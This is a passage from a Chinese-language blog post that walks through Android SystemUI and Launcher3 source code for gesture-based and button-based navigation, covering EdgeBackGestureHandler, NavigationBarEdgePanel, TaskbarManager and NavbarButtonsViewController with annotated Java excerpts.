class="comment">// 配置返回手势 Window 的参数</span></span><br><span class="line"><span class="comment">// 包括 flag、type、title 等属性</span></span><br><span class="line"><span class="keyword">private</span> WindowManager.LayoutParams <span class="title function_">createLayoutParams</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Resources</span> <span class="variable">resources</span> <span class="operator">=</span> mContext.getResources();</span><br><span class="line">    WindowManager.<span class="type">LayoutParams</span> <span class="variable">layoutParams</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WindowManager</span>.LayoutParams(</span><br><span class="line">            resources.getDimensionPixelSize(R.dimen.navigation_edge_panel_width),</span><br><span class="line">            resources.getDimensionPixelSize(R.dimen.navigation_edge_panel_height),</span><br><span class="line">            WindowManager.LayoutParams.TYPE_NAVIGATION_BAR_PANEL,</span><br><span class="line">            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE</span><br><span class="line">                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE</span><br><span class="line">                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,</span><br><span class="line">            PixelFormat.TRANSLUCENT);</span><br><span class="line">    ...</span><br><span class="line">    layoutParams.setTitle(TAG + mContext.getDisplayId());</span><br><span class="line">    layoutParams.setFitInsetsTypes(<span class="number">0</span> <span class="comment">/* types */</span>);</span><br><span class="line">    layoutParams.setTrustedOverlay();</span><br><span class="line">    <span class="keyword">return</span> layoutParams;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此手势导航创建完成。</p><blockquote><p>注意：此时 View 还是不可见的，后续事件产生的时候会进行展示和刷新</p></blockquote><p>下面粗略的看下手势相关的事件：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/navigationbar/gestural/EdgeBackGestureHandler.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">onMotionEvent</span><span class="params">(MotionEvent ev)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">action</span> <span class="operator">=</span> ev.getActionMasked();</span><br><span class="line">    <span class="keyword">if</span> (action == MotionEvent.ACTION_DOWN) &#123;</span><br><span class="line">        mInputEventReceiver.setBatchingEnabled(<span class="literal">false</span>);</span><br><span class="line">        mIsOnLeftEdge = ev.getX() &lt;= mEdgeWidthLeft + mLeftInset;</span><br><span class="line">        mMLResults = <span class="number">0</span>;</span><br><span class="line">        mLogGesture = <span class="literal">false</span>;</span><br><span class="line">        mInRejectedExclusion = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isWithinInsets</span> <span class="operator">=</span> isWithinInsets((<span class="type">int</span>) ev.getX(), (<span class="type">int</span>) ev.getY());</span><br><span class="line">        <span class="comment">// 根据返回手势是否有效、</span></span><br><span class="line">        <span class="comment">// 点击区域是否是停用区域等条件</span></span><br><span class="line">        <span class="comment">// 得到当前是否允许视图处理该手势</span></span><br><span class="line">        mAllowGesture = !mDisabledForQuickstep &amp;&amp; mIsBackGestureAllowed &amp;&amp; isWithinInsets</span><br><span class="line">                &amp;&amp; !mGestureBlockingActivityRunning</span><br><span class="line">                &amp;&amp; !QuickStepContract.isBackGestureDisabled(mSysUiFlags)</span><br><span class="line">                &amp;&amp; isWithinTouchRegion((<span class="type">int</span>) ev.getX(), (<span class="type">int</span>) ev.getY());</span><br><span class="line">        <span class="keyword">if</span> (mAllowGesture) &#123;</span><br><span class="line">            <span class="comment">// 更新当前是屏幕左侧还是右侧</span></span><br><span class="line">            mEdgeBackPlugin.setIsLeftPanel(mIsOnLeftEdge);</span><br><span class="line">            <span class="comment">// 发射事件给视图</span></span><br><span class="line">            mEdgeBackPlugin.onMotionEvent(ev);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mAllowGesture || mLogGesture) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!mThresholdCrossed) &#123;</span><br><span class="line">            mEndPoint.x = (<span class="type">int</span>) ev.getX();</span><br><span class="line">            mEndPoint.y = (<span class="type">int</span>) ev.getY();</span><br><span class="line">            <span class="comment">// 多个手指按下的话取消事件处理</span></span><br><span class="line">            <span class="keyword">if</span> (action == MotionEvent.ACTION_POINTER_DOWN) &#123;</span><br><span class="line">                <span class="keyword">if</span> (mAllowGesture) &#123;</span><br><span class="line">                    logGesture(SysUiStatsLog.BACK_GESTURE__TYPE__INCOMPLETE_MULTI_TOUCH);</span><br><span class="line">                    cancelGesture(ev);</span><br><span class="line">                &#125;</span><br><span class="line">                mLogGesture = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (action == MotionEvent.ACTION_MOVE) &#123;</span><br><span class="line">                <span class="comment">// 手指移动超过长按阈值的话</span></span><br><span class="line">                <span class="comment">// 也要取消事件处理</span></span><br><span class="line">                <span class="keyword">if</span> ((ev.getEventTime() - ev.getDownTime()) &gt; mLongPressTimeout) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (mAllowGesture) &#123;</span><br><span class="line">                        logGesture(SysUiStatsLog.BACK_GESTURE__TYPE__INCOMPLETE_LONG_PRESS);</span><br><span class="line">                        cancelGesture(ev);</span><br><span class="line">                    &#125;</span><br><span class="line">                    mLogGesture = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 通过上述检查的话</span></span><br><span class="line">        <span class="comment">// 将 MOVE、UP 交给视图</span></span><br><span class="line">        <span class="keyword">if</span> (mAllowGesture) &#123;</span><br><span class="line">            <span class="comment">// forward touch</span></span><br><span class="line">            mEdgeBackPlugin.onMotionEvent(ev);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mProtoTracer.scheduleFrameUpdate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事件间传递到 <strong>NavigationBarEdgePanel</strong> ，进行展示返回手势和触发返回。<br><strong>NavigationBarEdgePanel</strong> 继续进行后面的工作：手势的判断、视图的刷新、动画的展示。<br><strong>onMotionEvent()</strong> 的逻辑：</p><ul><li><strong>DOWN</strong> 的时候先让视图变为可见 VISIBLE</li><li><strong>MOVE</strong> 的处理通过 <strong>handleMoveEvent()</strong> 判断距离，决定是否要更新赋予 mTriggerBack</li><li><strong>UP</strong> 的时候将检查该变量决定是否触发返回动作即 <strong>triggerBack()</strong></li></ul><p><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/navigationbar/gestural/NavigationBarEdgePanel.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMotionEvent</span><span class="params">(MotionEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mVelocityTracker == <span class="literal">null</span>) &#123;</span><br><span class="line">        mVelocityTracker = VelocityTracker.obtain();</span><br><span class="line">    &#125;</span><br><span class="line">    mVelocityTracker.addMovement(event);</span><br><span class="line">    <span class="keyword">switch</span> (event.getActionMasked()) &#123;</span><br><span class="line">        <span class="keyword">case</span> MotionEvent.ACTION_DOWN:</span><br><span class="line">            mDragSlopPassed = <span class="literal">false</span>;</span><br><span class="line">            resetOnDown();</span><br><span class="line">            mStartX = event.getX();</span><br><span class="line">            mStartY = event.getY();</span><br><span class="line">            setVisibility(VISIBLE);</span><br><span class="line">            updatePosition(event.getY());</span><br><span class="line">            mRegionSamplingHelper.start(mSamplingRect);</span><br><span class="line">            mWindowManager.updateViewLayout(<span class="built_in">this</span>, mLayoutParams);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MotionEvent.ACTION_MOVE:</span><br><span class="line">            handleMoveEvent(event);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MotionEvent.ACTION_UP:</span><br><span class="line">            <span class="keyword">if</span> (mTriggerBack) &#123;</span><br><span class="line">                triggerBack();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cancelBack();</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>手势相关的事件流程到此打住了。</p><h4 id="2-按钮导航"><a href="#2-按钮导航" class="headerlink" title="2. 按钮导航"></a>2. 按钮导航</h4><p>按钮导航是在 <strong>TouchInteractionService.java</strong> 中的 <strong>onCreate()</strong> 方法开始的。<br><strong>packages/apps/Launcher3/quickstep/src/com/android/quickstep/TouchInteractionService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate();</span><br><span class="line">    <span class="comment">//省略其他代码....</span></span><br><span class="line">    </span><br><span class="line">    mTaskbarManager = <span class="keyword">new</span> <span class="title class_">TaskbarManager</span>(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">//省略其他代码....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户配置完成后，根据配置，是否加载按钮导航。如果加载则会调用 <strong>TaskbarManager.java</strong> 中的 <strong>recreateTaskbar()</strong> 方法。<br><strong>TaskbarManager#recreateTaskbar()</strong><br><strong>packages/apps/Launcher3/quickstep/src/com/android/launcher3/taskbar/TaskbarManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">recreateTaskbar</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 销毁现有任务栏</span></span><br><span class="line">    destroyExistingTaskbar();</span><br><span class="line">    <span class="comment">// 获取设备配置文件的</span></span><br><span class="line">    <span class="type">DeviceProfile</span> <span class="variable">dp</span> <span class="operator">=</span></span><br><span class="line">            mUserUnlocked ? LauncherAppState.getIDP(mContext).getDeviceProfile(mContext) : <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 任务栏是否启用</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isTaskBarEnabled</span> <span class="operator">=</span> dp != <span class="literal">null</span> &amp;&amp; dp.isTaskbarPresent;</span><br><span class="line">    <span class="keyword">if</span>(dp != <span class="literal">null</span>)&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;longzhiye&quot;</span>,<span class="string">&quot;longzhiye&quot;</span>+(dp != <span class="literal">null</span>)+<span class="string">&quot;----&quot;</span>+(dp.isTaskbarPresent));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!isTaskBarEnabled) &#123;</span><br><span class="line">        SystemUiProxy.INSTANCE.get(mContext)</span><br><span class="line">                .notifyTaskbarStatus(<span class="comment">/* visible */</span> <span class="literal">false</span>, <span class="comment">/* stashed */</span> <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TaskbarActivityContext 按钮导航的视图在里面加载，包括那个底部横线也在里面。</span></span><br><span class="line">    mTaskbarActivityContext = <span class="keyword">new</span> <span class="title class_">TaskbarActivityContext</span>(mContext, dp, mNavButtonController,</span><br><span class="line">            mUnfoldProgressProvider);</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    mTaskbarActivityContext.init(mSharedState);</span><br><span class="line">    <span class="keyword">if</span> (mActivity != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 设置相关控制器</span></span><br><span class="line">        mTaskbarActivityContext.setUIController(</span><br><span class="line">                createTaskbarUIControllerForActivity(mActivity));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <strong>TaskbarManager</strong> 类中有个 <strong>mDispInfoChangeListener</strong> 的监听，当导航模式切换时，会在 <strong>DisplayController</strong> 类中 去回调这里来。<br>接着往下看TaskbarActivityContext的构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TaskbarActivityContext</span><span class="params">(Context windowContext, DeviceProfile dp,</span></span><br><span class="line"><span class="params">        TaskbarNavButtonController buttonController, ScopedUnfoldTransitionProgressProvider</span></span><br><span class="line"><span class="params">        unfoldTransitionProgressProvider)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(windowContext);</span><br><span class="line">    mDeviceProfile = dp.copy(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Resources</span> <span class="variable">resources</span> <span class="operator">=</span> getResources();</span><br><span class="line">    mNavMode = DisplayController.getNavigationMode(windowContext);</span><br><span class="line">    mImeDrawsImeNavBar = getBoolByName(IME_DRAWS_IME_NAV_BAR_RES_NAME, resources, <span class="literal">false</span>);</span><br><span class="line">    mIsSafeModeEnabled = TraceHelper.allowIpcs(<span class="string">&quot;isSafeMode&quot;</span>,</span><br><span class="line">            () -&gt; getPackageManager().isSafeMode());</span><br><span class="line">    mIsUserSetupComplete = SettingsCache.INSTANCE.get(<span class="built_in">this</span>).getValue(</span><br><span class="line">            Settings.Secure.getUriFor(Settings.Secure.USER_SETUP_COMPLETE), <span class="number">0</span>);</span><br><span class="line">    mIsNavBarForceVisible = SettingsCache.INSTANCE.get(<span class="built_in">this</span>).getValue(</span><br><span class="line">            Settings.Secure.getUriFor(Settings.Secure.NAV_BAR_KIDS_MODE), <span class="number">0</span>);</span><br><span class="line">    mIsNavBarKidsMode = SettingsCache.INSTANCE.get(<span class="built_in">this</span>).getValue(</span><br><span class="line">            Settings.Secure.getUriFor(Settings.Secure.NAV_BAR_KIDS_MODE), <span class="number">0</span>);</span><br><span class="line">    updateIconSize(resources);</span><br><span class="line">    <span class="comment">// 首先获取显示和焦点，因为视图可能会在构造函数中使用它们。</span></span><br><span class="line">    <span class="type">Display</span> <span class="variable">display</span> <span class="operator">=</span> windowContext.getDisplay();</span><br><span class="line">    <span class="type">Context</span> <span class="variable">c</span> <span class="operator">=</span> display.getDisplayId() == Display.DEFAULT_DISPLAY</span><br><span class="line">            ? windowContext.getApplicationContext()</span><br><span class="line">            : windowContext.getApplicationContext().createDisplayContext(display);</span><br><span class="line">    mWindowManager = c.getSystemService(WindowManager.class);</span><br><span class="line">    mLeftCorner = display.getRoundedCorner(RoundedCorner.POSITION_BOTTOM_LEFT);</span><br><span class="line">    mRightCorner = display.getRoundedCorner(RoundedCorner.POSITION_BOTTOM_RIGHT);</span><br><span class="line">    <span class="comment">// 初始化 views.</span></span><br><span class="line">    mDragLayer = (TaskbarDragLayer) mLayoutInflater.inflate(</span><br><span class="line">            R.layout.taskbar, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="type">TaskbarView</span> <span class="variable">taskbarView</span> <span class="operator">=</span> mDragLayer.findViewById(R.id.taskbar_view);</span><br><span class="line">    <span class="type">TaskbarScrimView</span> <span class="variable">taskbarScrimView</span> <span class="operator">=</span> mDragLayer.findViewById(R.id.taskbar_scrim);</span><br><span class="line">    <span class="type">FrameLayout</span> <span class="variable">navButtonsView</span> <span class="operator">=</span> mDragLayer.findViewById(R.id.navbuttons_view);</span><br><span class="line">    <span class="type">StashedHandleView</span> <span class="variable">stashedHandleView</span> <span class="operator">=</span> mDragLayer.findViewById(R.id.stashed_handle);</span><br><span class="line">    mAccessibilityDelegate = <span class="keyword">new</span> <span class="title class_">TaskbarShortcutMenuAccessibilityDelegate</span>(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">// 构造控制器 controllers，将会在对应的控制添加对应的图标，以控制逻辑</span></span><br><span class="line">    mControllers = <span class="keyword">new</span> <span class="title class_">TaskbarControllers</span>(<span class="built_in">this</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarDragController</span>(<span class="built_in">this</span>),</span><br><span class="line">            buttonController,</span><br><span class="line">            getPackageManager().hasSystemFeature(FEATURE_PC)</span><br><span class="line">                    ? <span class="keyword">new</span> <span class="title class_">DesktopNavbarButtonsViewController</span>(<span class="built_in">this</span>, navButtonsView) :     </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">NavbarButtonsViewController</span>(<span class="built_in">this</span>, navButtonsView),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">RotationButtonController</span>(<span class="built_in">this</span>,</span><br><span class="line">                    c.getColor(R.color.taskbar_nav_icon_light_color),</span><br><span class="line">                    c.getColor(R.color.taskbar_nav_icon_dark_color),</span><br><span class="line">                    R.drawable.ic_sysbar_rotate_button_ccw_start_0,</span><br><span class="line">                    R.drawable.ic_sysbar_rotate_button_ccw_start_90,</span><br><span class="line">                    R.drawable.ic_sysbar_rotate_button_cw_start_0,</span><br><span class="line">                    R.drawable.ic_sysbar_rotate_button_cw_start_90,</span><br><span class="line">                    () -&gt; getDisplay().getRotation()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarDragLayerController</span>(<span class="built_in">this</span>, mDragLayer),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarViewController</span>(<span class="built_in">this</span>, taskbarView),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarScrimViewController</span>(<span class="built_in">this</span>, taskbarScrimView),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarUnfoldAnimationController</span>(<span class="built_in">this</span>, unfoldTransitionProgressProvider,</span><br><span class="line">                    mWindowManager, WindowManagerGlobal.getWindowManagerService()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarKeyguardController</span>(<span class="built_in">this</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">StashedHandleViewController</span>(<span class="built_in">this</span>, stashedHandleView),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarStashController</span>(<span class="built_in">this</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarEduController</span>(<span class="built_in">this</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarAutohideSuspendController</span>(<span class="built_in">this</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarPopupController</span>(<span class="built_in">this</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarForceVisibleImmersiveController</span>(<span class="built_in">this</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarAllAppsController</span>(<span class="built_in">this</span>, dp),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TaskbarInsetsController</span>(<span class="built_in">this</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(<span class="meta">@NonNull</span> TaskbarSharedState sharedState)</span> &#123;</span><br><span class="line">    mLastRequestedNonFullscreenHeight = getDefaultTaskbarWindowHeight();</span><br><span class="line">    mWindowLayoutParams = createDefaultWindowLayoutParams();</span><br><span class="line">    <span class="comment">//  在 TaskbarControllers控制器里，初始化前面构造方法中添加的各种控制器。</span></span><br><span class="line">    mControllers.init(sharedState);</span><br><span class="line">    updateSysuiStateFlags(sharedState.sysuiStateFlags, <span class="literal">true</span> <span class="comment">/* fromInit */</span>);</span><br><span class="line">    <span class="comment">// 生成 LayoutParams 用于将视图作为新窗口直接添加到 WindowManager</span></span><br><span class="line">    mWindowManager.addView(mDragLayer, mWindowLayoutParams);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里以 <strong>NavbarButtonsViewController</strong> 为例子分析：<br><strong>packages/apps/Launcher3/quickstep/src/com/android/launcher3/taskbar/NavbarButtonsViewController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Initializes the controller</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(TaskbarControllers controllers)</span> &#123;</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">// 强制导航按钮（特别是后退按钮）在设置向导期间可见。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isInSetup</span> <span class="operator">=</span> !mContext.isUserSetupComplete();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isInKidsMode</span> <span class="operator">=</span> mContext.isNavBarKidsModeActive();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">alwaysShowButtons</span> <span class="operator">=</span> isThreeButtonNav || isInSetup;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (alwaysShowButtons) &#123;</span><br><span class="line">        <span class="comment">// 初始化按钮</span></span><br><span class="line">        initButtons(mNavButtonContainer, mEndContextualContainer,</span><br><span class="line">                mControllers.navButtonController);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    mSeparateWindowParent.recreateControllers();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initButtons</span><span class="params">(ViewGroup navContainer, ViewGroup endContainer,</span></span><br><span class="line"><span class="params">        TaskbarNavButtonController navButtonController)</span> &#123;</span><br><span class="line">    <span class="comment">// back Button</span></span><br><span class="line">    mBackButton = addButton(R.drawable.ic_sysbar_back, BUTTON_BACK,</span><br><span class="line">            mNavButtonContainer, mControllers.navButtonController, R.id.back);</span><br><span class="line">    mBackButtonAlpha = <span class="keyword">new</span> <span class="title class_">MultiValueAlpha</span>(mBackButton, NUM_ALPHA_CHANNELS);</span><br><span class="line">    mBackButtonAlpha.setUpdateVisibility(<span class="literal">true</span>);</span><br><span class="line">    mPropertyHolders.add(<span class="keyword">new</span> <span class="title class_">StatePropertyHolder</span>(</span><br><span class="line">            mBackButtonAlpha.getProperty(ALPHA_INDEX_KEYGUARD_OR_DISABLE),</span><br><span class="line">            flags -&gt; &#123;</span><br><span class="line">                <span class="comment">// Show only if not disabled, and if not on the keyguard or otherwise only when</span></span><br><span class="line">                <span class="comment">// the bouncer or a lockscreen app is showing above the keyguard</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">showingOnKeyguard</span> <span class="operator">=</span> (flags &amp; FLAG_KEYGUARD_VISIBLE) == <span class="number">0</span> ||</span><br><span class="line">                        (flags &amp; FLAG_ONLY_BACK_FOR_BOUNCER_VISIBLE) != <span class="number">0</span> ||</span><br><span class="line">                        (flags &amp; FLAG_KEYGUARD_OCCLUDED) != <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span> (flags &amp; FLAG_DISABLE_BACK) == <span class="number">0</span></span><br><span class="line">                        &amp;&amp; ((flags &amp; FLAG_KEYGUARD_VISIBLE) == <span class="number">0</span> || showingOnKeyguard);</span><br><span class="line">            &#125;));</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isRtl</span> <span class="operator">=</span> Utilities.isRtl(mContext.getResources());</span><br><span class="line">    mPropertyHolders.add(<span class="keyword">new</span> <span class="title class_">StatePropertyHolder</span>(mBackButton,</span><br><span class="line">            flags -&gt; (flags &amp; FLAG_IME_VISIBLE) != <span class="number">0</span> &amp;&amp; !mContext.isNavBarKidsModeActive(),</span><br><span class="line">            View.ROTATION, isRtl ? 